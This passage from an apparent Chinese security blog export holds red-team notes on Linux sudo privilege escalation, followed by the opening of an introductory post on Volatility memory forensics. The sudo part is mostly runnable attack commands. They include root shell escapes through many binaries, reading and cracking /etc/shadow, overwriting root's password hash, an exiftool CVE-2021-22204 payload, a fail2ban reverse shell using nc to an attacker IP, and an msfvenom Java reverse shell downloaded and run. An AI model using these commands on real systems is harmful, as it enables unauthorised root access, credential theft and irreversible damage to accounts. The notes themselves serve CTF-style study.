<h2 id="4-sudo-ash"><a href="#4-sudo-ash" class="headerlink" title="4.sudo ash"></a>4.sudo ash</h2><h3 id="使用前提-3"><a href="#使用前提-3" class="headerlink" title="使用前提"></a>使用前提</h3><p><img src="https://s2.loli.net/2023/09/29/5WXaDbStK3ng1IY.png"></p>
<h3 id="使用流程-3"><a href="#使用流程-3" class="headerlink" title="使用流程"></a>使用流程</h3><p>ash本身就是一个shell文件，识别出可直接进行提权。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ash</span><br></pre></td></tr></table></figure>

<h2 id="5-sudo-awk"><a href="#5-sudo-awk" class="headerlink" title="5.sudo awk"></a>5.sudo awk</h2><h3 id="使用前提-4"><a href="#使用前提-4" class="headerlink" title="使用前提"></a>使用前提</h3><p><img src="https://s2.loli.net/2023/09/29/dSZrTELn5jgoaIY.png"></p>
<h3 id="使用流程-4"><a href="#使用流程-4" class="headerlink" title="使用流程"></a>使用流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo awk &#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>AWK 是一个优良的文本处理工具，有两种特殊模式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEGIN&#123;&#125;: 读入第一行文本之前执行的语句，一般用来初始化操作</span><br><span class="line">&#123;&#125;: 逐行处理</span><br><span class="line">END&#123;&#125;: 处理完最后以行文本后执行，一般用来处理输出结果</span><br></pre></td></tr></table></figure>

<p>这种利用方法就是使用BEGIN模式写入脚本，执行系统命令进行提权</p>
<h2 id="6-sudo-base64"><a href="#6-sudo-base64" class="headerlink" title="6.sudo base64"></a>6.sudo base64</h2><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src="https://s2.loli.net/2023/09/29/7wdZhI4VU6ptFDT.png"></p>
<h3 id="使用流程-5"><a href="#使用流程-5" class="headerlink" title="使用流程"></a>使用流程</h3><ol>
<li><p>查看读取权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/shadow</span><br></pre></td></tr></table></figure>
</li>
<li><p>声明变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[变量名称]=/etc/shadow</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用Base64解码＋编码的过程去读取敏感信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo base64 &quot;$[变量名]&quot; | base64 -d </span><br></pre></td></tr></table></figure>

<p><img src="D:\00000\Documents\linux提权\sudo\7.PNG" alt="7"></p>
</li>
<li><p>继续使用john解密哈希值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim xxx[存放报错信息]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo john [上述存放报错信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]</span><br></pre></td></tr></table></figure></li>
</ol>
<p>同理，相关的base都是可以使用相同的方法利用提权。</p>
<h2 id="7-sudo-bash"><a href="#7-sudo-bash" class="headerlink" title="7.sudo bash"></a>7.sudo bash</h2><h3 id="使用方法-1"><a href="#使用方法-1" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src="https://s2.loli.net/2023/09/29/7ukFf2cKzBYpVDO.png"></p>
<h3 id="使用流程-6"><a href="#使用流程-6" class="headerlink" title="使用流程"></a>使用流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo bash</span><br></pre></td></tr></table></figure>

<p>类似的shell还有csh dash sh tcsh zsh，都可以直接sudo提权</p>
<h2 id="8-sudo-cp"><a href="#8-sudo-cp" class="headerlink" title="8.sudo cp"></a>8.sudo cp</h2><h3 id="使用方法-2"><a href="#使用方法-2" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src="https://s2.loli.net/2023/09/29/SmTB4sizjqy7x6D.png"></p>
<h3 id="使用流程-7"><a href="#使用流程-7" class="headerlink" title="使用流程"></a>使用流程</h3><ol>
<li><p>使用mkpasswd生成密钥</p>
<p>PS：正常kali中shadow的是哈希512</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512 123456</span><br></pre></td></tr></table></figure>

<p>生成相应的密钥保存</p>
</li>
<li><p>找出root的shadow的对应密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cat /etc/shadow | grep root</span><br></pre></td></tr></table></figure>
</li>
<li><p>将生成的哈希值替换root的哈希值，并保存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim [文件名称]</span><br></pre></td></tr></table></figure>
</li>
<li><p>声明环境变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[任意定义环境变量名称1]=/etc/shadow</span><br></pre></td></tr></table></figure>
</li>
<li><p>指向生成的临时文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[任意定义环境变量名称2]=$(mktemp)</span><br></pre></td></tr></table></figure>
</li>
<li><p>写入临时文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;[存放替换哈希值的root]&#x27; &gt; $[任意定义环境变量名称2]</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[任意定义环境变量名称1]sudo /usr/bin/cp $[任意定义环境变量名称2] $[任意定义环境变量名称1]</span><br></pre></td></tr></table></figure>

<p>PS:这种办法会导致shadow被覆盖，且无法恢复，谨慎使用！！！</p>
</li>
</ol>
<h2 id="9-sudo-cpulimit"><a href="#9-sudo-cpulimit" class="headerlink" title="9.sudo cpulimit"></a>9.sudo cpulimit</h2><h3 id="使用方法-3"><a href="#使用方法-3" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src="https://s2.loli.net/2023/09/29/gWu2NABRLdV784r.png"></p>
<p><img src="D:\00000\Documents\linux提权\sudo\10.PNG" alt="10"></p>
<h3 id="使用流程-8"><a href="#使用流程-8" class="headerlink" title="使用流程"></a>使用流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo cpulimit -l 100 -f /bin/bash</span><br></pre></td></tr></table></figure>

<p>通过指定cpu的使用频率来启动权限，从而实现提权</p>
<h2 id="10-sudo-curl"><a href="#10-sudo-curl" class="headerlink" title="10.sudo curl"></a>10.sudo curl</h2><p><img src="https://s2.loli.net/2023/09/29/BHbRGCrdxYh2KOF.png"></p>
<ol>
<li><p>生成指定密码的哈希值，并进行替换，仿照9已有步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512 123456</span><br><span class="line">sudo cat /etc/shadow | grep root</span><br><span class="line">vim [文件名称]</span><br></pre></td></tr></table></figure>
</li>
<li><p>开启临时服务器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo php -S 0:80</span><br></pre></td></tr></table></figure>
</li>
<li><p>访问，并进行覆盖替换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo curl http://10.10.10.10/[文件名称] -o /etc/shadow</span><br></pre></td></tr></table></figure>

<p>PS:这种办法会导致shadow被覆盖，且无法恢复，谨慎使用！！！</p>
</li>
</ol>
<p><strong><u>剩下的所有使用前提皆为通过<code>sudo -l</code>存在对应的&#x2F;bin&#x2F;bash&#x2F;xxx，为可利用的前提条件，如有特殊，会额外标注</u></strong></p>
<h2 id="11-sudo-date"><a href="#11-sudo-date" class="headerlink" title="11.sudo date"></a>11.sudo date</h2><ol>
<li><p>通过报错信息得到root相关信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo date -f /etc/shadow</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用john尝试破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim xxx[存放root信息]</span><br><span class="line">sudo john [上述存放root信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="12-sudo-dd"><a href="#12-sudo-dd" class="headerlink" title="12.sudo dd"></a>12.sudo dd</h2><p>dd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。</p>
<ol>
<li><p>生成指定密码的哈希值，并进行替换，仿照9已有步骤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd -m sha-512 123456</span><br><span class="line">sudo cat /etc/shadow | grep root</span><br><span class="line">vim [文件名称]</span><br></pre></td></tr></table></figure>
</li>
<li><p>dd操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;[生成的root信息记录]&#x27; | sudo dd of=/etc/shadow</span><br></pre></td></tr></table></figure>

<p>PS:这种办法会导致shadow被覆盖，且无法恢复，谨慎使用！！！</p>
</li>
</ol>
<h2 id="13-sudo-dstat"><a href="#13-sudo-dstat" class="headerlink" title="13.sudo dstat"></a>13.sudo dstat</h2><ol>
<li><p>找到dstat的插件路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name dstat -type d 2&gt;/dev/null</span><br><span class="line">ls  #展示路径</span><br></pre></td></tr></table></figure>
</li>
<li><p>编辑构造插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim [构造的插件名称]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import OS;OS.execv(&quot;/bin/bash&quot;,[&quot;bash&quot;])    #写入提权</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp [构造的插件名称] [插件的路径]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dstat --[插件名称]</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="14-sudo-ed"><a href="#14-sudo-ed" class="headerlink" title="14.sudo ed"></a>14.sudo ed</h2><p>Linux中的ed命令用于启动“ed文本编辑器”，这是一个基于行的文本编辑器。它是Linux中功能最简单的文本编辑程序，一次仅能编辑一行而非全屏幕方式的操作。它可以帮助用户执行许多操作，如创建，编辑，显示和操作文件。</p>
<ol>
<li><p>进入编辑器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/ed</span><br></pre></td></tr></table></figure>
</li>
<li><p>利用！执行系统命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">！/bin/bash</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="15-sudo-env"><a href="#15-sudo-env" class="headerlink" title="15.sudo env"></a>15.sudo env</h2><p>env用于执行在指定环境下的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo env /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="16-sudo-exiftool-CVE2021-22204"><a href="#16-sudo-exiftool-CVE2021-22204" class="headerlink" title="16.sudo exiftool(CVE2021-22204)"></a>16.sudo exiftool(CVE2021-22204)</h2><p>仅展示利用过程如下，暂未详细了解，参数不是很懂</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi payload</span><br><span class="line">(metadata &quot;\c$&#123;system(&#x27;/bin/bash&#x27;)&#125;;&quot;)</span><br><span class="line">bzz payload payload.bzz</span><br><span class="line">djvumake exploit.djvu INFO=&#x27;1,1&#x27; BGjp=/dev/null ANTz=payload.bzz</span><br><span class="line">sudo exiftool exploit.djvu</span><br></pre></td></tr></table></figure>

<h2 id="17-sudo-expect"><a href="#17-sudo-expect" class="headerlink" title="17.sudo expect"></a>17.sudo expect</h2><p>expect是一个自动化交互套件，主要应用于执行命令和程序时，系统以交互形式要求输入指定字符串，实现交互通信。</p>
<p>-c参数是允许在命令行中使用脚本代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo expect -c &quot;spawn /bin/bash;interact&quot;</span><br></pre></td></tr></table></figure>

<h2 id="18-sudo-fail2ban"><a href="#18-sudo-fail2ban" class="headerlink" title="18.sudo fail2ban"></a>18.sudo fail2ban</h2><p><a href="https://link.zhihu.com/?target=https://github.com/fail2ban/fail2ban">Fail2Ban</a> 是一款入侵防御软件，可以保护服务器免受暴力攻击。 它是用 Python 编程语言编写的。 Fail2Ban 基于auth 日志文件工作，默认情况下它会扫描所有 auth 日志文件，如 <code>/var/log/auth.log</code>、<code>/var/log/apache/access.log</code> 等，并禁止带有恶意标志的IP，比如密码失败太多，寻找漏洞等等标志。</p>
<p>通常，Fail2Ban 用于更新防火墙规则，用于在指定的时间内拒绝 IP 地址。 它也会发送邮件通知。 Fail2Ban 为各种服务提供了许多过滤器，如 ssh、apache、nginx、squid、named、mysql、nagios 等。</p>
<p>Fail2Ban 能够降低错误认证尝试的速度，但是它不能消除弱认证带来的风险。 这只是服务器防止暴力攻击的安全手段之一。</p>
<ol>
<li><p>查找相关目录，并忽略报错信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -name &quot;fail2ban*&quot; -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>寻找可写目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find /etc -writable -type d 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
</li>
<li><p>进入查看配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim jail.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2023/09/29/wkLIoz28E1gWOtR.png"></p>
<p>主要是为了确认fail2ban的规则设置，以便利用</p>
</li>
<li><p>进行属组变动</p>
<p><img src="https://s2.loli.net/2023/09/29/FLXqDj5I1cmZltz.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -liah iptables-multiport.conf</span><br><span class="line">mv iptables-multiport.conf iptables-multiport.conf.bak</span><br><span class="line">ls -liah iptables-multiport.conf.bak</span><br><span class="line">cp iptables-multiport.conf.bak iptables-multiport.conf</span><br></pre></td></tr></table></figure>
</li>
<li><p>actionban</p>
<p>就是触发ban行为之后使用反弹shell去提全部</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actionban = rm /tmp/f;mkfifo /tmp/f;cat /tmp/f |/bin/bash -i 2&gt;&amp;1 | nc 10.10.10.10 [监听端口] &gt; /tmp/f</span><br><span class="line">#以上是改写的.conf文件中的配置</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp [监听端口]</span><br><span class="line">#开启监听</span><br></pre></td></tr></table></figure>

<p>反复输入密码触犯ban行为就行</p>
</li>
</ol>
<p>PS：提权涉及到的部分linux底层权限知识还没完全听懂~~</p>
<h2 id="19-sudo-find"><a href="#19-sudo-find" class="headerlink" title="19.sudo find"></a>19.sudo find</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo find . -exec /bin/bash \; -quit</span><br><span class="line"># 命令解释： 以find 命令 执行查找当前目录的命令。   </span><br><span class="line"># find  (一个路径或文件必须存在)  -exec  执行命令 （结束）\;</span><br><span class="line">#-quit进行退出</span><br></pre></td></tr></table></figure>

<h2 id="20-sudo-flock"><a href="#20-sudo-flock" class="headerlink" title="20.sudo flock"></a>20.sudo flock</h2><p>文件锁 flock</p>
<p>为解决多进程对同一文件的读写冲突，在linux 系统中，提供了 flock 这一系统调用，用来实现对文件的读写保护，即文件锁的功能。文件锁保护文件的功能，与 fork 多进程及 pthread 库中多线程使用读写锁来保护内存资源的方式是类似的。 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo flock -u / /bin/bash</span><br><span class="line">#-u参数解锁根目录下的一个文件，并进行操作，以此来尝试提权</span><br></pre></td></tr></table></figure>

<h2 id="21-sudo-ftp"><a href="#21-sudo-ftp" class="headerlink" title="21.sudo ftp"></a>21.sudo ftp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo ftp</span><br><span class="line">#启用交互式的命令行</span><br><span class="line">ftp&gt; !/bin/bash</span><br><span class="line">#！告诉执行系统命令</span><br></pre></td></tr></table></figure>

<h2 id="22-sudo-gcc"><a href="#22-sudo-gcc" class="headerlink" title="22.sudo gcc"></a>22.sudo gcc</h2><p>编译过程中将wrapper所携带语句执行以达到提权目的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gcc -wrapper /bin/bash,-s .</span><br><span class="line">#.只是让gcc在当前目录下进行随意编译，为防止报错。当然，如果专门写一个源文件进行编译也可以。</span><br></pre></td></tr></table></figure>

<h2 id="23-sudo-gdb"><a href="#23-sudo-gdb" class="headerlink" title="23.sudo gdb"></a>23.sudo gdb</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gdb -nx -ex &#x27;!bin/bash&#x27; -ex quit</span><br><span class="line">#-nx指不读取任何初始化文件</span><br><span class="line">#-ex启动bash</span><br></pre></td></tr></table></figure>

<h2 id="24-sudo-git"><a href="#24-sudo-git" class="headerlink" title="24.sudo git"></a>24.sudo git</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo git branch --help</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="25-sudo-gzip-gunzip"><a href="#25-sudo-gzip-gunzip" class="headerlink" title="25.sudo gzip&#x2F;gunzip"></a>25.sudo gzip&#x2F;gunzip</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gzip -f /etc/shadow -t </span><br><span class="line">#主要为了拿密码的哈希值</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim xxx[存放敏感信息]</span><br><span class="line">sudo john [上述存放敏感信息的文件] --wordlist=/usr/share/wordlists/rockyou.txt[字典存放]</span><br></pre></td></tr></table></figure>

<h2 id="26-sudo-hping3"><a href="#26-sudo-hping3" class="headerlink" title="26.sudo hping3"></a>26.sudo hping3</h2><p><strong>hping</strong> 是用于生成和解析TCPIP协议数据包的开源工具，类似于ftp提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo hping3</span><br><span class="line">hping3&gt; /bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="27-sudo-iftop"><a href="#27-sudo-iftop" class="headerlink" title="27.sudo iftop"></a>27.sudo iftop</h2><p>iftop是类似于top的实时流量监控工具，可以用来监控网卡的实时流量（可以指定网段）、反向解析IP、显示端口信息等。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo iftop</span><br><span class="line">！/bin/bash</span><br></pre></td></tr></table></figure>

<h2 id="28-sudo-java"><a href="#28-sudo-java" class="headerlink" title="28.sudo java"></a>28.sudo java</h2><ol>
<li><p>生成反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo msfvenom -p java/shell_reverse_tcp LHOST=[攻击机ip地址] LPORT=[端口] -f jar -o shell.jar </span><br></pre></td></tr></table></figure>
</li>
<li><p>建立简易的服务器用于传递shell文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo php -s 0:80</span><br></pre></td></tr></table></figure>
</li>
<li><p>本地建立监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp [端口]</span><br></pre></td></tr></table></figure>
</li>
<li><p>下载生成的shell并进行执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wegt [地址]/shell.jar</span><br><span class="line">chomd +x shell.jar</span><br><span class="line">sudo java -jar shell.jar</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>红队笔记</category>
      </categories>
      <tags>
        <tag>linux提权之sudo</tag>
      </tags>
  </entry>
  <entry>
    <title>内存取证初识</title>
    <url>/2023/09/29/%E5%8F%96%E8%AF%81%EF%BC%881%EF%BC%89%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%88%9D%E8%AF%86/</url>
    <content><![CDATA[<h1 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h1><p>&emsp;&emsp;内存取证是指在计算机系统的内存中进行取证分析，以获取有关计算机系统当前状态的信息。内存取证通常用于分析计算机系统上运行的进程、网络连接、文件、注册表等信息，并可以用于检测和分析恶意软件、网络攻击和其他安全事件</p>
<h2 id="Volatility"><a href="#Volatility" class="headerlink" title="Volatility"></a>Volatility</h2><p>&emsp;&emsp;Volatility是一款开源的内存分析框架，主要用于从计算机内存中提取数字证据。它可以用于取证、恶意代码分析、漏洞研究、操作系统学习以及其他安全领域</p>
<h3 id="基本命令使用格式"><a href="#基本命令使用格式" class="headerlink" title="基本命令使用格式"></a>基本命令使用格式</h3><pre><code>python vol.py -f [image] ‐-profile=[profile][plugin] 命令

其中 -f 后面加的是要取证的文件， --profile 后加的是工具识别出的系统版本， [plugin] 是指使用的插件，其中默认存在一些插件，另外还可以自己下载一些插件扩充
</code></pre>
<p><img src="https://s2.loli.net/2023/09/29/BHWkJuCXGl4ODg9.png"><br>使用<code>python vol.py -h </code>命令可查看基本的使用帮助</p>
<h3 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h3><p>&emsp;&emsp;内存取证的流程简要概况就是以下几步：解析Windows&#x2F;Linux&#x2F;Mac OS的内存结构、分析进程等内存数据、根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据.<br>&emsp;&emsp;识别常用文件名后缀，如raw文件、vmem文件、img文件、dmp文件等内存镜像文件</p>
<pre><code>volatility -f [] imageinfo 
[]中添加文件名
</code></pre>
<p>&emsp;&emsp;用该命令查看基本信息，根据查到的信息确定profile的值<br>剩下的基本流程可以推荐看一下<a href="https://cloud.tencent.com/developer/article/1419462" title="volatility">这篇博客</a></p>
<h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ul>
<li>amcache        	查看AmCache应用程序痕迹信息</li>
<li>apihooks       	检测内核及进程的内存空间中的API hook</li>
<li>atoms          	列出会话及窗口站atom表</li>
<li>atomscan       	Atom表的池扫描(Pool scanner)</li>
<li>auditpol       	列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息</li>
<li>bigpools       	使用BigPagePoolScanner转储大分页池(big page pools)</li>
<li>bioskbd        	从实时模式内存中读取键盘缓冲数据(早期电脑可以读取出BIOS开机密码)</li>
<li>cachedump      	获取内存中缓存的域帐号的密码哈希</li>
<li>callbacks      	打印全系统通知例程</li>
<li>clipboard      	提取Windows剪贴板中的内容</li>
<li>cmdline        	显示进程命令行参数</li>
<li>cmdscan        	提取执行的命令行历史记录（扫描 COMMAND HISTORY信息）</li>
<li>connections    	打印系统打开的网络连接(仅支持Windows XP 和2003)</li>
<li>connscan       	打印TCP连接信息</li>
<li>consoles       	提取执行的命令行历史记录（扫描 CONSOLE INFORMATION信息）</li>
<li>crashinfo      	提取崩溃转储信息</li>
<li>deskscan       	tagDESKTOP池扫描(Poolscaner)</li>
<li>devicetree     	显示设备树信息</li>
<li>dlldump        	从进程地址空间转储动态链接库</li>
<li>dlllist        	打印每个进程加载的动态链接库列表</li>
<li>driverirp      	IRP hook驱动检测</li>
<li>drivermodule   	关联驱动对象至内核模块</li>
<li>driverscan     	驱动对象池扫描</li>
<li>dumpcerts      	提取RAS私钥及SSL公钥</li>
<li><strong>dumpfiles      	提取内存中映射或缓存的文件</strong></li>
<li>dumpregistry   	转储内存中注册表信息至磁盘</li>
<li>editbox        	查看Edit编辑控件信息 (Listbox正在实验中)</li>
<li><strong>envars         	显示进程的环境变量</strong></li>
<li>eventhooks     	打印Windows事件hook详细信息</li>
<li>evtlogs        	提取Windows事件日志（仅支持XP&#x2F;2003)</li>
<li><strong>filescan       	提取文件对象（file objects）池信息</strong></li>
<li>gahti          	转储用户句柄（handle）类型信息</li>
<li>gditimers      	打印已安装的GDI计时器(timers)及回调(callbacks)</li>
<li>gdt            	显示全局描述符表(Global Deor Table)</li>
<li>getservicesids 	获取注册表中的服务名称并返回SID信息</li>
<li>getsids        	打印每个进程的SID信息</li>
<li>handles        	打印每个进程打开的句柄的列表</li>
<li><strong>hashdump       	转储内存中的Windows帐户密码哈希(LM&#x2F;NTLM)</strong></li>
<li>hibinfo        	转储休眠文件信息</li>
<li><strong>hivedump       	打印注册表配置单元信息</strong></li>
<li><strong>hivelist       	打印注册表配置单元列表</strong></li>
<li>hivescan       	注册表配置单元池扫描</li>
<li>hpakextract    	从HPAK文件（Fast Dump格式）提取物理内存数据</li>
<li>hpakinfo       	查看HPAK文件属性及相关信息</li>
<li>idt            	显示中断描述符表(Interrupt Deor Table)</li>
<li><strong>iehistory      	重建IE缓存及访问历史记录</strong></li>
<li>imagecopy      	将物理地址空间导出原生DD镜像文件</li>
<li>imageinfo      	查看&#x2F;识别镜像信息</li>
<li>impscan        	扫描对导入函数的调用</li>
<li>joblinks       	打印进程任务链接信息</li>
<li>kdbgscan       	搜索和转储潜在KDBG值</li>
<li>kpcrscan       	搜索和转储潜在KPCR值</li>
<li>ldrmodules     	检测未链接的动态链接DLL</li>
<li>lsadump        	从注册表中提取LSA密钥信息（已解密）</li>
<li>machoinfo      	转储Mach-O 文件格式信息</li>
<li>malfind        	查找隐藏的和插入的代码</li>
<li>mbrparser      	扫描并解析潜在的主引导记录(MBR)</li>
<li><strong>memdump        	转储进程的可寻址内存</strong></li>
<li>memmap         	打印内存映射</li>
<li>messagehooks   	桌面和窗口消息钩子的线程列表</li>
<li>mftparser      	扫描并解析潜在的MFT条目</li>
<li>moddump        	转储内核驱动程序到可执行文件的示例</li>
<li>modscan        	内核模块池扫描</li>
<li>modules        	打印加载模块的列表</li>
<li>multiscan      	批量扫描各种对象</li>
<li>mutantscan     	对互斥对象池扫描</li>
<li><strong>notepad        	查看记事本当前显示的文本</strong></li>
<li><strong>netscan           查看命令行操作</strong></li>
<li>objtypescan    	扫描窗口对象类型对象</li>
<li>patcher        	基于页面扫描的补丁程序内存</li>
<li>poolpeek       	可配置的池扫描器插件</li>
<li><strong>printkey       	打印注册表项及其子项和值</strong></li>
<li>privs          	显示进程权限</li>
<li>procdump       	进程转储到一个可执行文件示例</li>
<li><strong>pslist         	按照EPROCESS列表打印所有正在运行的进程</strong></li>
<li>psscan         	进程对象池扫描</li>
<li>pstree         	以树型方式打印进程列表</li>
<li>psxview        	查找带有隐藏进程的所有进程列表</li>
<li>qemuinfo       	转储 Qemu 信息</li>
<li>raw2dmp        	将物理内存原生数据转换为windbg崩溃转储格式</li>
<li><strong>screenshot     	基于GDI Windows的虚拟屏幕截图保存</strong></li>
<li>servicediff    	Windows服务列表(ala Plugx)</li>
<li>sessions       	_MM_SESSION_SPACE的详细信息列表(用户登录会话)</li>
<li>shellbags      	打印Shellbags信息</li>
<li>shimcache      	解析应用程序兼容性Shim缓存注册表项</li>
<li>shutdowntime   	从内存中的注册表信息获取机器关机时间</li>
<li>sockets        	打印已打开套接字列表</li>
<li>sockscan       	TCP套接字对象池扫描</li>
<li>ssdt           	显示SSDT条目</li>
<li>strings        	物理到虚拟地址的偏移匹配(需要一些时间，带详细信息)</li>
<li><strong>svcscan        	Windows服务列表扫描</strong></li>
<li>symlinkscan    	符号链接对象池扫描</li>
<li>thrdscan       	线程对象池扫描</li>
<li>threads        	调查_ETHREAD 和_KTHREADs</li>
<li><strong>timeliner      	创建内存中的各种痕迹信息的时间线</strong></li>
<li>timers         	打印内核计时器及关联模块的DPC</li>
<li>truecryptmaster	Recover 	恢复TrueCrypt 7.1a主密钥</li>
<li>truecryptpassphrase		查找并提取TrueCrypt密码</li>
<li>truecryptsummary	TrueCrypt摘要信息</li>
<li>unloadedmodules	打印卸载的模块信息列表</li>
<li><strong>userassist     	打印注册表中UserAssist相关信息</strong></li>
<li>userhandles    	转储用户句柄表</li>
<li>vaddump        	转储VAD数据为文件</li>
<li>vadinfo        	转储VAD信息</li>
<li>vadtree        	以树形方式显示VAD树信息</li>
<li>vadwalk        	显示遍历VAD树</li>
<li>vboxinfo       	转储Virtualbox信息（虚拟机）</li>
<li>verinfo        	打印PE镜像中的版本信息</li>
<li>vmwareinfo     	转储VMware VMSS&#x2F;VMSN 信息</li>
<li>volshell       	内存镜像中的shell</li>
<li>windows        	打印桌面窗口(详细信息)</li>
<li>wintree        	Z顺序打印桌面窗口树</li>
<li>wndscan        	池扫描窗口站</li>
<li>yarascan       	以Yara签名扫描进程或内核内存</li>
</ul>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><h3 id="Dumplt"><a href="#Dumplt" class="headerlink" title="Dumplt"></a>Dumplt</h3><p>&emsp;&emsp;利用Dumplt可以将一个系统的完整内存镜像dump下来，dumplt制作的内存镜像(raw文件)与系统内存接近<br><img src="https://s2.loli.net/2023/09/29/QpI85BzeqYLk27K.png"></p>
<h3 id="AccessData-FTK-Imager"><a href="#AccessData-FTK-Imager" class="headerlink" title="AccessData FTK Imager"></a>AccessData FTK Imager</h3><p><strong>主要功能</strong>：</p>
<ol>
<li><p>证据获取</p>
</li>
<li><p>哈希值计算</p>
</li>
<li><p>文件查看及提取</p>
</li>
<li><p>镜像文件挂载</p>
</li>
<li><p>数据恢复</p>
</li>
<li><p>特定数据提取</p>
<p><img src="https://s2.loli.net/2023/09/29/1AIFx76qMDn4aev.png"></p>
</li>
</ol>
<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>下载得到附件，为一个dump文件  </p>
<p>先查看dump文件的profile值</p>
<p>  <img src="https://s2.loli.net/2023/09/29/ugQZbrV7NXh1OmH.png"><br>展示进程</p>
